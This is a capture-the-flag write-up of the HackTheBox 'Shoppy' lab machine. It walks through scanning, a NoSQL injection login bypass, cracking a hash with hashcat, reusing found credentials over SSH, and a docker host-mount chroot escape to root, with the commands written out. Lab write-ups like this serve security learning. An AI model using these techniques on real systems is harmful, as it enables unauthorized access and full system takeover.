# HackTheBox Shoppy WriteUp
Machine IP: 10.10.11.180

![Ping](images/img(1).png?raw=true "Ping")

<br/>

### -> NMAP SCAN

```
sudo nmap -vvv -cSV -p0-65535 --reason -T4 10.10.11.184 -oN shoppy.nmap
```

Discovered shoppy.htb by browsing, add to /etc/hosts

![Ping](images/img(2).png?raw=true "hosts")

### -> WEB ENUM

Go to the browser and have a look at the website’s code and in general, the website look. 

![Ping](images/img(3).png?raw=true "hosts" height="500")

We don’t find anything interesting here so we run gobuster.

![Ping](images/img(4).png?raw=true "hosts")

Looks like we have a login page here to take advantage of this

![Ping](images/img(5).png?raw=true "hosts")

Figured out it’s using nosql and made it to the admin page using this injection, go to search for users and type in that query again

![Ping](images/img(6).png?raw=true "hosts")

Write any name in the input field and then click on download exports

![Ping](images/img(7).png?raw=true "hosts")

![Ping](images/img(8).png?raw=true "hosts")

The hash can be cracked using hashcat

```
hashcat -m 0 hash.txt rockyou.txt
```

![Ping](images/img(9).png?raw=true "hosts")

Now that we have the password, 

### -> FOOTHOLD

We need to do subdomain enumeration.

```
gobuster vhost --url http://shoppy.htb -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt
```

![Ping](images/img(11).png?raw=true "hosts")

Were we have mattermost.shoppy.htb, add it to /etc/hosts

![Ping](images/img(10).png?raw=true "hosts")

Then browse the link and log in using the credentials we found

![Ping](images/img(12).png?raw=true "hosts")

After logging in we see different rooms on the left hand side we go to deploy machine section and see that we have the credentials for deploying the machine.

![Ping](images/img(13).png?raw=true "hosts")

Login via ssh as jaeger to fetch the user flag

![Ping](images/img(14).png?raw=true "hosts")

### -> ROOT

Check sudo rights
```
sudo -l
```
Here we see jaeger may deploy the /home/deploy/password-manager. Check the text of the this program and spot the following line, see the word Sample?
```
cat /home/deploy/password-manager
```
![Ping](images/img(16).png?raw=true "hosts")

Enter the master password and switch to deploy, Here we see deploy and password

```
sudo -u deploy /home/deploy/password-manager 
```

![Ping](images/img(17).png?raw=true "hosts")

Move to deploy user using these credentials 

```
su deploy
```

![Ping](images/img(18).png?raw=true "hosts")

If you went to the mattermost subdomain there’s a hint there:

![Ping](images/img(19).png?raw=true "hosts")

He’s using docker for deployment, we might find exploits going to [Check Here](https://gtfobins.github.io/#docker)

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![Ping](images/img(20).png?raw=true "hosts")

Boom! Got root flag